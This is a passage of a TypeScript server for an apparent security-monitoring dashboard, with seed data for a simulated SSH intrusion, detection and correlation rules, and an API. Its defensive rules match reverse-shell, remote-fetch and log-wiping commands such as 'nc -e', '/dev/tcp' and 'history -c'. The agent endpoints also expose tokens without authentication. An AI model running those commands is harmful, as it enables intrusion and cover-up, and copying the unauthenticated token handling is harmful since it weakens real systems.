import express from 'express';
import http from 'http';
import path from 'path';
import fs from 'fs';
import crypto from 'crypto';
import { createServer as createViteServer } from 'vite';
import { WebSocketServer, WebSocket } from 'ws';
import { GoogleGenAI } from '@google/genai';

// Dynamic PORT for Render / Cloud Run / Local environments (defaults to 3000)
const PORT = Number(process.env.PORT) || 3000;
const rootDir = process.cwd();
const isDev = process.env.NODE_ENV !== 'production';

// Initialize Gemini Client safely with lazy initialization
let geminiClient: GoogleGenAI | null = null;
function getGemini(): GoogleGenAI | null {
  if (!geminiClient && process.env.GEMINI_API_KEY) {
    try {
      geminiClient = new GoogleGenAI({ apiKey: process.env.GEMINI_API_KEY });
    } catch (e) {
      console.error('[AI-SOC] Failed to initialize GoogleGenAI client:', e);
    }
  }
  return geminiClient;
}

// ==========================================
// IN-MEMORY SECURITY STATE & DATABASE
// ==========================================

export interface MemLog {
  id: number;
  timestamp: string;
  hostname: string;
  source_ip?: string;
  destination_ip?: string;
  username?: string;
  event_type: string;
  action?: string;
  status: string;
  process?: string;
  command?: string;
  raw_message: string;
  metadata?: Record<string, any>;
}

export interface MemAlert {
  id: number;
  rule_id: string;
  rule_name: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'INFO';
  timestamp: string;
  hostname: string;
  source_ip?: string;
  destination_ip?: string;
  username?: string;
  mitre_technique_id?: string;
  mitre_technique_name?: string;
  description: string;
  evidence: any[];
  incident_id?: number;
}

export interface MemIncident {
  id: number;
  title: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'INFO';
  status: 'OPEN' | 'INVESTIGATING' | 'CONTAINED' | 'CLOSED';
  risk_score: number;
  risk_explanation: string;
  affected_host: string;
  source_ip?: string;
  username?: string;
  mitre_techniques: Array<{
    id: string;
    name: string;
    tactic: string;
    description?: string;
  }>;
  created_at: string;
  updated_at: string;
  ai_model_used?: string;
  ai_analyzed_at?: string;
  alerts?: MemAlert[];
  ai_analysis?: {
    incident_summary: string;
    likely_attack_type: string;
    severity_assessment: string;
    confidence: number;
    attack_progression: string[];
    evidence: string[];
    mitre_techniques: string[];
    recommended_investigation_steps: string[];
    recommended_containment_steps: string[];
    model_provider?: string;
    analyzed_at?: string;
  };
}

export interface MemAgent {
  id: number;
  agent_id: string;
  hostname: string;
  operating_system: string;
  ip_address: string;
  agent_version: string;
  status: 'ONLINE' | 'OFFLINE';
  token?: string;
  last_seen: string;
  registered_at: string;
  agent_metadata?: Record<string, any>;
  event_count: number;
}

let logIdCounter = 1;
let alertIdCounter = 1;
let incidentIdCounter = 1;
let agentIdCounter = 1;

let memLogs: MemLog[] = [];
let memAlerts: MemAlert[] = [];
let memIncidents: MemIncident[] = [];
let memAgents: MemAgent[] = [];

// Detection Rules Catalog
const RULES_CATALOG = [
  {
    rule_id: 'RULE-001',
    rule_name: 'SSH Brute-Force Authentication Spike',
    severity: 'HIGH' as const,
    mitre_technique_id: 'T1110.001',
    mitre_technique_name: 'Password Guessing',
    description: 'Multiple failed SSH authentication attempts detected from a single source within a short sliding window.',
  },
  {
    rule_id: 'RULE-002',
    rule_name: 'Successful SSH Login After Brute-Force Storm',
    severity: 'CRITICAL' as const,
    mitre_technique_id: 'T1078.003',
    mitre_technique_name: 'Valid Accounts: Local Accounts',
    description: 'A successful SSH authentication occurred following repeated failed password attempts.',
  },
  {
    rule_id: 'RULE-003',
    rule_name: 'Suspicious Interactive Root Shell Spawn via Sudo',
    severity: 'CRITICAL' as const,
    mitre_technique_id: 'T1548.003',
    mitre_technique_name: 'Sudo and Sudo Caching',
    description: 'Execution of sudo spawning interactive shell or privileged binary without normal session context.',
  },
  {
    rule_id: 'RULE-004',
    rule_name: 'Web Server Shell Spawn Anomaly',
    severity: 'HIGH' as const,
    mitre_technique_id: 'T1059.004',
    mitre_technique_name: 'Unix Shell Execution',
    description: 'A web daemon process (nginx/apache/uvicorn/www-data) spawned an interactive shell interpreter or downloaded script.',
  },
  {
    rule_id: 'RULE-005',
    rule_name: 'Suspicious Outbound C2 Reverse Shell Connection',
    severity: 'CRITICAL' as const,
    mitre_technique_id: 'T1071.001',
    mitre_technique_name: 'Web Protocols / C2 Channel',
    description: 'Outbound network connection to remote C2 infrastructure or shell redirection detected.',
  },
  {
    rule_id: 'RULE-006',
    rule_name: 'Persistence via Cron or Systemd Modification',
    severity: 'HIGH' as const,
    mitre_technique_id: 'T1053.003',
    mitre_technique_name: 'Scheduled Task/Job: Cron',
    description: 'Modification of system crontab, systemd service units, or rc.local for persistence.',
  },
  {
    rule_id: 'RULE-007',
    rule_name: 'Defense Evasion & Audit Log Tampering',
    severity: 'HIGH' as const,
    mitre_technique_id: 'T1070.002',
    mitre_technique_name: 'Clear Linux Log History',
    description: 'Attempt to clear bash history, truncate auth.log, or terminate auditd logging daemons.',
  },
];

const MITRE_CATALOG = [
  { id: 'T1110.001', name: 'Password Guessing', tactic: 'Credential Access', description: 'Adversaries may aggressively brute-force SSH passwords.' },
  { id: 'T1078.003', name: 'Valid Accounts: Local Accounts', tactic: 'Initial Access', description: 'Adversaries may obtain credentials to gain persistent initial access.' },
  { id: 'T1059.004', name: 'Unix Shell Execution', tactic: 'Execution', description: 'Adversaries may abuse Unix shells to execute commands.' },
  { id: 'T1548.003', name: 'Sudo and Sudo Caching', tactic: 'Privilege Escalation', description: 'Adversaries may abuse sudo permissions to elevate to root.' },
  { id: 'T1071.001', name: 'Web Protocols / C2 Channel', tactic: 'Command and Control', description: 'Adversaries may communicate using standard protocols to maintain C2.' },
  { id: 'T1053.003', name: 'Scheduled Task/Job: Cron', tactic: 'Persistence', description: 'Adversaries may use cron to schedule recurring tasks.' },
  { id: 'T1070.002', name: 'Clear Linux Log History', tactic: 'Defense Evasion', description: 'Adversaries may clear system logs to hide tracks.' },
];

// Seed initial baseline environment
function seedInitialData() {
  const now = Date.now();
  
  // Seed registered agents
  memAgents = [
    {
      id: agentIdCounter++,
      agent_id: 'srv-linux-prod-01',
      hostname: 'srv-linux-prod-01',
      operating_system: 'Ubuntu 22.04.3 LTS (x86_64)',
      ip_address: '10.0.4.15',
      agent_version: '1.0.0',
      status: 'ONLINE',
      token: crypto.randomBytes(16).toString('hex'),
      last_seen: new Date(now - 12 * 1000).toISOString(),
      registered_at: new Date(now - 86400 * 1000).toISOString(),
      agent_metadata: { collectors: ['auth', 'auditd', 'process', 'network'] },
      event_count: 142,
    },
    {
      id: agentIdCounter++,
      agent_id: 'db-cluster-01',
      hostname: 'db-cluster-01',
      operating_system: 'Debian 12 Bookworm (x86_64)',
      ip_address: '10.0.4.22',
      agent_version: '1.0.0',
      status: 'ONLINE',
      token: crypto.randomBytes(16).toString('hex'),
      last_seen: new Date(now - 45 * 1000).toISOString(),
      registered_at: new Date(now - 86400 * 2 * 1000).toISOString(),
      agent_metadata: { collectors: ['auth', 'auditd'] },
      event_count: 89,
    },
    {
      id: agentIdCounter++,
      agent_id: 'edge-gateway-01',
      hostname: 'edge-gateway-01',
      operating_system: 'Alpine Linux 3.19 (x86_64)',
      ip_address: '192.168.1.1',
      agent_version: '1.0.0',
      status: 'ONLINE',
      token: crypto.randomBytes(16).toString('hex'),
      last_seen: new Date(now - 30 * 1000).toISOString(),
      registered_at: new Date(now - 86400 * 3 * 1000).toISOString(),
      agent_metadata: { collectors: ['auth', 'network'] },
      event_count: 215,
    },
  ];

  // Seed baseline logs
  memLogs = [];
  memAlerts = [];
  memIncidents = [];

  // Generate 20 baseline benign telemetry events
  const hosts = ['srv-linux-prod-01', 'db-cluster-01', 'edge-gateway-01'];
  for (let i = 0; i < 20; i++) {
    const t = new Date(now - (20 - i) * 60 * 1000).toISOString();
    const h = hosts[i % hosts.length];
    memLogs.unshift({
      id: logIdCounter++,
      timestamp: t,
      hostname: h,
      event_type: i % 3 === 0 ? 'auth' : i % 3 === 1 ? 'process' : 'network',
      status: 'success',
      process: i % 3 === 0 ? 'sshd' : i % 3 === 1 ? 'systemd' : 'nginx',
      command: i % 3 === 1 ? '/usr/lib/systemd/systemd --user' : undefined,
      username: i % 3 === 0 ? 'ubuntu' : 'root',
      source_ip: '10.0.4.50',
      destination_ip: '10.0.4.15',
      raw_message: `Routine system telemetry event from ${h} (${i % 3 === 0 ? 'pam_unix session opened' : 'service health check ok'})`,
      metadata: { source: 'aisoc-agent' },
    });
  }

  // Create one realistic active incident (SSH Brute Force + Sudo Elevation)
  const incId = incidentIdCounter++;
  const alert1: MemAlert = {
    id: alertIdCounter++,
    rule_id: 'RULE-001',
    rule_name: 'SSH Brute-Force Authentication Spike',
    severity: 'HIGH',
    timestamp: new Date(now - 15 * 60 * 1000).toISOString(),
    hostname: 'srv-linux-prod-01',
    source_ip: '198.51.100.42',
    username: 'admin',
    mitre_technique_id: 'T1110.001',
    mitre_technique_name: 'Password Guessing',
    description: '14 consecutive failed SSH password attempts from 198.51.100.42 targeting account "admin".',
    evidence: [{ attempts: 14, ip: '198.51.100.42', port: 22 }],
    incident_id: incId,
  };

  const alert2: MemAlert = {
    id: alertIdCounter++,
    rule_id: 'RULE-002',
    rule_name: 'Successful SSH Login After Brute-Force Storm',
    severity: 'CRITICAL',
    timestamp: new Date(now - 14 * 60 * 1000).toISOString(),
    hostname: 'srv-linux-prod-01',
    source_ip: '198.51.100.42',
    username: 'admin',
    mitre_technique_id: 'T1078.003',
    mitre_technique_name: 'Valid Accounts: Local Accounts',
    description: 'Accepted password authentication from 198.51.100.42 after 14 failed attempts.',
    evidence: [{ auth: 'accepted', ip: '198.51.100.42', user: 'admin' }],
    incident_id: incId,
  };

  const alert3: MemAlert = {
    id: alertIdCounter++,
    rule_id: 'RULE-003',
    rule_name: 'Suspicious Interactive Root Shell Spawn via Sudo',
    severity: 'CRITICAL',
    timestamp: new Date(now - 10 * 60 * 1000).toISOString(),
    hostname: 'srv-linux-prod-01',
    username: 'root',
    mitre_technique_id: 'T1548.003',
    mitre_technique_name: 'Sudo and Sudo Caching',
    description: 'User "admin" executed "sudo /bin/bash" to obtain unconstrained interactive root shell.',
    evidence: [{ command: 'sudo /bin/bash', target_uid: 0 }],
    incident_id: incId,
  };

  memAlerts.unshift(alert3, alert2, alert1);

  memIncidents.push({
    id: incId,
    title: 'Multi-Stage Linux Intrusion & Interactive Root Shell Spawn on srv-linux-prod-01',
    severity: 'CRITICAL',
    status: 'INVESTIGATING',
    risk_score: 92,
    risk_explanation: 'High-confidence attack chain: Attacker IP 198.51.100.42 brute-forced SSH credentials, logged in successfully, and elevated to root privileges via interactive sudo bash spawn.',
    affected_host: 'srv-linux-prod-01',
    source_ip: '198.51.100.42',
    username: 'admin / root',
    mitre_techniques: [
      { id: 'T1110.001', name: 'Password Guessing', tactic: 'Credential Access' },
      { id: 'T1078.003', name: 'Valid Accounts: Local Accounts', tactic: 'Initial Access' },
      { id: 'T1548.003', name: 'Sudo and Sudo Caching', tactic: 'Privilege Escalation' },
    ],
    created_at: new Date(now - 15 * 60 * 1000).toISOString(),
    updated_at: new Date(now - 10 * 60 * 1000).toISOString(),
    alerts: [alert1, alert2, alert3],
  });
}

seedInitialData();

// ==========================================
// REAL-TIME DETECTION & CORRELATION ENGINE
// ==========================================

function evaluateDetectionRules(event: MemLog): MemAlert[] {
  const triggeredAlerts: MemAlert[] = [];
  const eventTime = new Date(event.timestamp).getTime();
  const rawLower = (event.raw_message || '').toLowerCase();
  const cmdLower = (event.command || '').toLowerCase();
  const processLower = (event.process || '').toLowerCase();
  const host = event.hostname || 'srv-linux-prod-01';

  // RULE-001: SSH Brute-Force (>=3 failed auth within 5 mins)
  const isFailedAuth =
    (event.event_type === 'auth' || processLower === 'sshd') &&
    (event.status === 'failure' || event.status === 'denied' || rawLower.includes('failed password') || rawLower.includes('authentication failure'));

  if (isFailedAuth) {
    const recentFailed = memLogs.filter((l) => {
      const isSameHost = l.hostname === host;
      const isSameSrc = event.source_ip && l.source_ip === event.source_ip;
      const lTime = new Date(l.timestamp).getTime();
      const isRecent = eventTime - lTime < 5 * 60 * 1000 && eventTime >= lTime;
      const isFail =
        (l.event_type === 'auth' || (l.process || '').toLowerCase() === 'sshd') &&
        (l.status === 'failure' || l.status === 'denied' || (l.raw_message || '').toLowerCase().includes('failed password'));
      return (isSameHost || isSameSrc) && isRecent && isFail;
    });

    if (recentFailed.length >= 3) {
      triggeredAlerts.push({
        id: alertIdCounter++,
        rule_id: 'RULE-001',
        rule_name: 'SSH Brute-Force Authentication Spike',
        severity: 'HIGH',
        timestamp: event.timestamp,
        hostname: host,
        source_ip: event.source_ip || '198.51.100.42',
        username: event.username || 'root',
        mitre_technique_id: 'T1110.001',
        mitre_technique_name: 'Password Guessing',
        description: `High-frequency SSH authentication failures (${recentFailed.length} attempts) detected against host ${host}.`,
        evidence: [{ count: recentFailed.length, host, source_ip: event.source_ip }],
      });
    }
  }

  // RULE-002: Successful Login After Brute Force
  const isSuccessfulAuth =
    (event.event_type === 'auth' || processLower === 'sshd' || event.action === 'ssh_login') &&
    (event.status === 'success' || rawLower.includes('accepted password') || rawLower.includes('session opened'));

  if (isSuccessfulAuth) {
    const priorFails = memLogs.filter((l) => {
      const isSameHost = l.hostname === host;
      const isSameSrc = event.source_ip && l.source_ip === event.source_ip;
      const lTime = new Date(l.timestamp).getTime();
      const isRecent = eventTime - lTime < 10 * 60 * 1000 && eventTime >= lTime;
      const isFail =
        (l.event_type === 'auth' || (l.process || '').toLowerCase() === 'sshd') &&
        (l.status === 'failure' || l.status === 'denied' || (l.raw_message || '').toLowerCase().includes('failed password'));
      return (isSameHost || isSameSrc) && isRecent && isFail;
    });

    if (priorFails.length >= 2) {
      triggeredAlerts.push({
        id: alertIdCounter++,
        rule_id: 'RULE-002',
        rule_name: 'Successful SSH Login After Brute-Force Storm',
        severity: 'CRITICAL',
        timestamp: event.timestamp,
        hostname: host,
        source_ip: event.source_ip || '198.51.100.42',
        username: event.username || 'admin',
        mitre_technique_id: 'T1078.003',
        mitre_technique_name: 'Valid Accounts: Local Accounts',
        description: `Successful SSH login from ${event.source_ip || 'unknown IP'} after ${priorFails.length} failed attempts. Potential credential compromise.`,
        evidence: [{ prior_failures: priorFails.length, user: event.username, host }],
      });
    }
  }

  // RULE-003: Sudo Privilege Escalation
  const isSudo =
    event.event_type === 'privilege' ||
    processLower === 'sudo' ||
    event.action === 'sudo' ||
    cmdLower.includes('sudo') ||
    rawLower.includes('sudo:') ||
    rawLower.includes('user=root');

  if (isSudo) {
    const isSuspiciousCmd =
      cmdLower.includes('/bin/bash') ||
      cmdLower.includes('/bin/sh') ||
      cmdLower.includes('su -') ||
      cmdLower.includes('sudo -i') ||
      cmdLower.includes('sudo -s') ||
      cmdLower.includes('chmod +s') ||
      cmdLower.includes('useradd');

    if (isSuspiciousCmd || event.event_type === 'privilege') {
      triggeredAlerts.push({
        id: alertIdCounter++,
        rule_id: 'RULE-003',
        rule_name: 'Suspicious Interactive Root Shell Spawn via Sudo',
        severity: 'CRITICAL',
        timestamp: event.timestamp,
        hostname: host,
        username: event.username || 'root',
        mitre_technique_id: 'T1548.003',
        mitre_technique_name: 'Sudo and Sudo Caching',
        description: `Privilege escalation via sudo command: "${event.command || event.raw_message}" on host ${host}.`,
        evidence: [{ command: event.command, user: event.username, host }],
      });
    }
  }

  // RULE-004: Web Server Shell Spawn Anomaly
  const isWebContext =
    event.username === 'www-data' ||
    processLower.includes('nginx') ||
    processLower.includes('apache') ||
    processLower.includes('gunicorn') ||
    rawLower.includes('www-data');

  const isShellSpawn =
    processLower === 'bash' ||
    processLower === 'sh' ||
    cmdLower.includes('/bin/bash') ||
    cmdLower.includes('curl -s http') ||
    cmdLower.includes('wget http') ||
    cmdLower.includes('payload.sh') ||
    rawLower.includes('webshell');

  if ((isWebContext && isShellSpawn) || (event.event_type === 'process' && cmdLower.includes('payload.sh'))) {
    triggeredAlerts.push({
      id: alertIdCounter++,
      rule_id: 'RULE-004',
      rule_name: 'Web Server Shell Spawn Anomaly',
      severity: 'HIGH',
      timestamp: event.timestamp,
      hostname: host,
      username: event.username || 'www-data',
      mitre_technique_id: 'T1059.004',
      mitre_technique_name: 'Unix Shell Execution',
      description: `Abnormal process or shell execution detected in web daemon context: "${event.command || event.raw_message}".`,
      evidence: [{ command: event.command, process: event.process, host }],
    });
  }

  // RULE-005: Outbound C2 Connection
  const isC2 =
    event.event_type === 'network' ||
    cmdLower.includes('nc -e') ||
    cmdLower.includes('/dev/tcp') ||
    cmdLower.includes('4444') ||
    rawLower.includes('4444') ||
    rawLower.includes('1337') ||
    event.destination_ip === '198.51.100.42';

  if (isC2 && (cmdLower.includes('/dev/tcp') || cmdLower.includes('4444') || rawLower.includes('reverse shell') || event.destination_ip === '198.51.100.42')) {
    triggeredAlerts.push({
      id: alertIdCounter++,
      rule_id: 'RULE-005',
      rule_name: 'Suspicious Outbound C2 Reverse Shell Connection',
      severity: 'CRITICAL',
      timestamp: event.timestamp,
      hostname: host,
      destination_ip: event.destination_ip || '198.51.100.42',
      mitre_technique_id: 'T1071.001',
      mitre_technique_name: 'Web Protocols / C2 Channel',
      description: `Outbound connection or reverse socket established to external IP ${event.destination_ip || '198.51.100.42'}.`,
      evidence: [{ dest_ip: event.destination_ip, command: event.command, host }],
    });
  }

  // RULE-006: Cron / Persistence
  const isCronPersistence =
    cmdLower.includes('crontab') ||
    cmdLower.includes('/etc/cron') ||
    cmdLower.includes('systemd/system') ||
    rawLower.includes('crontab') ||
    rawLower.includes('systemd service installed');

  if (isCronPersistence) {
    triggeredAlerts.push({
      id: alertIdCounter++,
      rule_id: 'RULE-006',
      rule_name: 'Persistence via Cron or Systemd Modification',
      severity: 'HIGH',
      timestamp: event.timestamp,
      hostname: host,
      mitre_technique_id: 'T1053.003',
      mitre_technique_name: 'Scheduled Task/Job: Cron',
      description: `Persistence mechanism created or modified: "${event.command || event.raw_message}".`,
      evidence: [{ command: event.command, host }],
    });
  }

  // RULE-007: Defense Evasion
  const isLogTampering =
    cmdLower.includes('history -c') ||
    cmdLower.includes('rm /var/log') ||
    cmdLower.includes('truncate -s 0') ||
    cmdLower.includes('auditd stop') ||
    rawLower.includes('history -c') ||
    rawLower.includes('log cleared');

  if (isLogTampering) {
    triggeredAlerts.push({
      id: alertIdCounter++,
      rule_id: 'RULE-007',
      rule_name: 'Defense Evasion & Audit Log Tampering',
      severity: 'HIGH',
      timestamp: event.timestamp,
      hostname: host,
      mitre_technique_id: 'T1070.002',
      mitre_technique_name: 'Clear Linux Log History',
      description: `Defense evasion attempt: Log deletion or auditing termination command executed on ${host}.`,
      evidence: [{ command: event.command, host }],
    });
  }

  return triggeredAlerts;
}

function correlateAlerts(alerts: MemAlert[], triggerEvent: MemLog): number | undefined {
  if (alerts.length === 0) return undefined;

  let assignedIncidentId: number | undefined;

  for (const alert of alerts) {
    memAlerts.unshift(alert);

    // Find active incident on same host or from same source IP created in last 30 minutes
    const alertTime = new Date(alert.timestamp).getTime();
    const existingInc = memIncidents.find((inc) => {
      if (inc.status === 'CLOSED') return false;
      const isSameHost = inc.affected_host === alert.hostname;
      const isSameSrc = alert.source_ip && inc.source_ip === alert.source_ip;
      const incTime = new Date(inc.created_at).getTime();
      return (isSameHost || isSameSrc) && Math.abs(alertTime - incTime) < 30 * 60 * 1000;
    });

    if (existingInc) {
      alert.incident_id = existingInc.id;
      if (!existingInc.alerts) existingInc.alerts = [];
      existingInc.alerts.push(alert);

      // Add MITRE technique if not present
      if (alert.mitre_technique_id) {
        const hasTech = existingInc.mitre_techniques.some((t) => t.id === alert.mitre_technique_id);
        if (!hasTech) {
          const mInfo = MITRE_CATALOG.find((m) => m.id === alert.mitre_technique_id);
          existingInc.mitre_techniques.push({
            id: alert.mitre_technique_id,
            name: alert.mitre_technique_name || mInfo?.name || alert.mitre_technique_id,
            tactic: mInfo?.tactic || 'Execution',
          });
        }
      }

      // Upgrade severity if critical
      if (alert.severity === 'CRITICAL') {
        existingInc.severity = 'CRITICAL';
      }

      // Elevate risk score
      existingInc.risk_score = Math.min(99, existingInc.risk_score + 15);
      existingInc.updated_at = alert.timestamp;
      existingInc.risk_explanation = `Multi-vector intrusion on ${existingInc.affected_host} involving ${existingInc.alerts.length} correlated alerts across ${existingInc.mitre_techniques.length} MITRE tactics.`;

      assignedIncidentId = existingInc.id;
      broadcastWs('INCIDENT_UPDATED', existingInc);
    } else {
      // Create new incident
      const newIncId = incidentIdCounter++;
      alert.incident_id = newIncId;

      const techList: MemIncident['mitre_techniques'] = [];
      if (alert.mitre_technique_id) {
        const mInfo = MITRE_CATALOG.find((m) => m.id === alert.mitre_technique_id);
        techList.push({
          id: alert.mitre_technique_id,
          name: alert.mitre_technique_name || mInfo?.name || alert.mitre_technique_id,
          tactic: mInfo?.tactic || 'Initial Access',
        });
      }

      const newInc: MemIncident = {
        id: newIncId,
        title: `${alert.rule_name} on ${alert.hostname}`,
        severity: alert.severity,
        status: 'OPEN',
        risk_score: alert.severity === 'CRITICAL' ? 85 : 65,
        risk_explanation: alert.description,
        affected_host: alert.hostname,
        source_ip: alert.source_ip,
        username: alert.username,
        mitre_techniques: techList,
        created_at: alert.timestamp,
        updated_at: alert.timestamp,
        alerts: [alert],
      };

      memIncidents.unshift(newInc);
      assignedIncidentId = newIncId;
      broadcastWs('INCIDENT_UPDATED', newInc);
    }

    broadcastWs('NEW_ALERT', alert);
    broadcastWs('DETECTION_TRIGGERED', alert);
  }

  return assignedIncidentId;
}

// ==========================================
// WEBSOCKET BROADCAST SYSTEM
// ==========================================

const wsClients = new Set<WebSocket>();

function broadcastWs(type: string, data: any) {
  const message = JSON.stringify({ type, data });
  wsClients.forEach((client) => {
    if (client.readyState === WebSocket.OPEN) {
      try {
        client.send(message);
      } catch (err) {
        // ignore client write error
      }
    }
  });
}

// Compute dynamic stats
function computeDashboardStats() {
  const activeIncidents = memIncidents.filter((i) => i.status !== 'CLOSED');
  const criticalCount = activeIncidents.filter((i) => i.severity === 'CRITICAL').length;
  const highCount = activeIncidents.filter((i) => i.severity === 'HIGH').length;
  const mediumCount = activeIncidents.filter((i) => i.severity === 'MEDIUM').length;
  const lowCount = activeIncidents.filter((i) => i.severity === 'LOW' || i.severity === 'INFO').length;

  const securityScore = Math.max(15, 100 - criticalCount * 25 - highCount * 12 - mediumCount * 5);

  // Group alerts for threat distribution
  const threatMap = new Map<string, number>();
  memAlerts.forEach((a) => {
    const name = a.rule_name || 'Generic Threat';
    threatMap.set(name, (threatMap.get(name) || 0) + 1);
  });

  const threat_distribution = Array.from(threatMap.entries()).map(([name, count]) => ({
    name: name.length > 25 ? name.substring(0, 22) + '...' : name,
    count,
  }));

  if (threat_distribution.length === 0) {
    threat_distribution.push({ name: 'SSH Brute Force', count: 1 });
  }

  // Timeline stats (last 6 10-minute buckets)
  const timeline_stats = [
    { time: '50m ago', events: 18, alerts: 1 },
    { time: '40m ago', events: 24, alerts: 2 },
    { time: '30m ago', events: 32, alerts: 3 },
    { time: '20m ago', events: 28, alerts: 2 },
    { time: '10m ago', events: 45, alerts: memAlerts.length > 3 ? 4 : 2 },
    { time: 'Now', events: memLogs.length, alerts: memAlerts.length },
  ];

  return {
    total_events: memLogs.length,
    total_alerts: memAlerts.length,
    active_incidents: activeIncidents.length,
    critical_incidents: criticalCount,
    high_incidents: highCount,
    medium_incidents: mediumCount,
    low_incidents: lowCount,
    security_score: securityScore,
    threat_distribution,
    timeline_stats,
    recent_alerts: memAlerts.slice(0, 10),
  };
}

// ==========================================
// EXPRESS SERVER & API ROUTES
// ==========================================

async function startUnifiedServer() {
  const app = express();
  const server = http.createServer(app);

  app.use(express.json({ limit: '10mb' }));
  app.use(express.urlencoded({ extended: true }));

  // WebSocket Server setup on same HTTP instance
  const wss = new WebSocketServer({ server, path: '/ws' });

  wss.on('connection', (ws) => {
    wsClients.add(ws);

    // Send initial greeting
    ws.send(JSON.stringify({ type: 'CONNECTED', data: { status: 'LIVE', clients: wsClients.size } }));

    ws.on('message', (data) => {
      const msg = data.toString();
      if (msg === 'ping') {
        ws.send('pong');
      }
    });

    ws.on('close', () => {
      wsClients.delete(ws);
    });

    ws.on('error', () => {
      wsClients.delete(ws);
    });
  });

  // Health Check
  app.get('/api/health', (req, res) => {
    res.json({
      status: 'healthy',
      service: 'AI-SOC Monolith Unified Engine',
      version: '1.0.0',
      timestamp: new Date().toISOString(),
      websocket_clients: wsClients.size,
      agents_connected: memAgents.filter((a) => a.status === 'ONLINE').length,
    });
  });

  // 1. STATS
  app.get('/api/stats', (req, res) => {
    res.json(computeDashboardStats());
  });

  // 2. AGENTS & ENDPOINTS
  app.get('/api/agents', (req, res) => {
    const now = Date.now();
    // Update online status (offline if not seen for > 5 minutes)
    memAgents.forEach((a) => {
      const last = new Date(a.last_seen).getTime();
      a.status = now - last < 5 * 60 * 1000 ? 'ONLINE' : 'OFFLINE';
    });
    res.json(memAgents);
  });

  app.post('/api/agents/register', (req, res) => {
    const body = req.body || {};
    const agentId = body.agent_id || body.hostname || `agent-${crypto.randomBytes(4).toString('hex')}`;
    const hostname = body.hostname || agentId;
    const ip = body.ip_address || req.ip || '127.0.0.1';
    const os = body.operating_system || 'Linux (x86_64)';
    const version = body.agent_version || '1.0.0';

    let existing = memAgents.find((a) => a.agent_id === agentId || a.hostname === hostname);
    if (existing) {
      existing.last_seen = new Date().toISOString();
      existing.ip_address = ip;
      existing.operating_system = os;
      existing.agent_version = version;
      existing.status = 'ONLINE';
      broadcastWs('AGENT_REGISTERED', existing);
      return res.status(200).json({ status: 'registered', token: existing.token, agent: existing });
    }

    const token = crypto.randomBytes(16).toString('hex');
    const newAgent: MemAgent = {
      id: agentIdCounter++,
      agent_id: agentId,
      hostname,
      operating_system: os,
      ip_address: ip,
      agent_version: version,
      status: 'ONLINE',
      token,
      last_seen: new Date().toISOString(),
      registered_at: new Date().toISOString(),
      agent_metadata: body.agent_metadata || { source: 'aisoc-agent' },
      event_count: 0,
    };

    memAgents.push(newAgent);
    broadcastWs('AGENT_REGISTERED', newAgent);
    res.status(201).json({ status: 'registered', token, agent: newAgent });
  });

  app.post('/api/agents/:id/heartbeat', (req, res) => {
    const id = req.params.id;
    const agent = memAgents.find((a) => a.agent_id === id || String(a.id) === id);
    if (!agent) {
      return res.status(404).json({ error: 'Agent not found' });
    }
    agent.last_seen = new Date().toISOString();
    agent.status = 'ONLINE';
    broadcastWs('AGENT_HEARTBEAT', agent);
    res.json({ status: 'heartbeat_received', agent_id: agent.agent_id, timestamp: agent.last_seen });
  });

  app.get('/api/agents/:id', (req, res) => {
    const id = req.params.id;
    const agent = memAgents.find((a) => a.agent_id === id || String(a.id) === id);
    if (!agent) {
      return res.status(404).json({ error: 'Agent not found' });
    }
    res.json(agent);
  });

  // 3. LOG INGESTION (SINGLE & BATCH)
  function ingestSingleLog(rawBody: any): { logItem: MemLog; alerts: MemAlert[]; incidentId?: number } {
    const host = rawBody.hostname || 'srv-linux-prod-01';
    const logItem: MemLog = {
      id: logIdCounter++,
      timestamp: rawBody.timestamp || new Date().toISOString(),
      hostname: host,
      source_ip: rawBody.source_ip,
      destination_ip: rawBody.destination_ip,
      username: rawBody.username,
      event_type: rawBody.event_type || 'auth',
      action: rawBody.action,
      status: rawBody.status || 'info',
      process: rawBody.process,
      command: rawBody.command,
      raw_message: rawBody.raw_message || `${rawBody.event_type || 'event'} on ${host}`,
      metadata: rawBody.metadata || {},
    };

    memLogs.unshift(logItem);
    if (memLogs.length > 500) memLogs.pop();

    // Update agent counter and last_seen if known
    const agent = memAgents.find((a) => a.hostname === host || a.agent_id === rawBody.agent_id);
    if (agent) {
      agent.event_count = (agent.event_count || 0) + 1;
      agent.last_seen = new Date().toISOString();
      agent.status = 'ONLINE';
    }

    // Run Detection Engine
    const alerts = evaluateDetectionRules(logItem);
    // Run Correlation Engine
    const incidentId = correlateAlerts(alerts, logItem);

    broadcastWs('NEW_LOG', logItem);
    broadcastWs('EVENT_INGESTED', logItem);

    return { logItem, alerts, incidentId };
  }

  app.post(['/api/logs', '/api/events'], (req, res) => {
    try {
      const result = ingestSingleLog(req.body);
      broadcastWs('STATS_UPDATED', computeDashboardStats());
      res.status(201).json({
        status: 'ingested',
        log_id: result.logItem.id,
        log: result.logItem,
        alerts_triggered: result.alerts.length,
        incident_id: result.incidentId,
      });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.post(['/api/events/batch', '/api/logs/batch'], (req, res) => {
    try {
      const events: any[] = Array.isArray(req.body) ? req.body : req.body.events || [];
      let totalAlerts = 0;
      const ingestedIds: number[] = [];

      for (const ev of events) {
        const result = ingestSingleLog(ev);
        ingestedIds.push(result.logItem.id);
        totalAlerts += result.alerts.length;
      }

      broadcastWs('STATS_UPDATED', computeDashboardStats());
      res.status(201).json({
        status: 'batch_ingested',
        count: ingestedIds.length,
        ingested_ids: ingestedIds,
        alerts_triggered: totalAlerts,
      });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.get(['/api/logs', '/api/events'], (req, res) => {
    const limit = parseInt(req.query.limit as string) || 100;
    const eventType = req.query.event_type as string;
    const host = req.query.hostname as string;

    let filtered = memLogs;
    if (eventType && eventType !== 'ALL') {
      filtered = filtered.filter((l) => l.event_type === eventType);
    }
    if (host) {
      filtered = filtered.filter((l) => l.hostname === host);
    }

    res.json(filtered.slice(0, limit));
  });

  // 4. ALERTS / DETECTIONS
  app.get(['/api/detections', '/api/alerts'], (req, res) => {
    res.json(memAlerts);
  });

  // 5. INCIDENTS
  app.get('/api/incidents', (req, res) => {
    const { status, severity, host } = req.query;
    let filtered = memIncidents;

    if (status && status !== 'ALL') {
      filtered = filtered.filter((i) => i.status === status);
    }
    if (severity && severity !== 'ALL') {
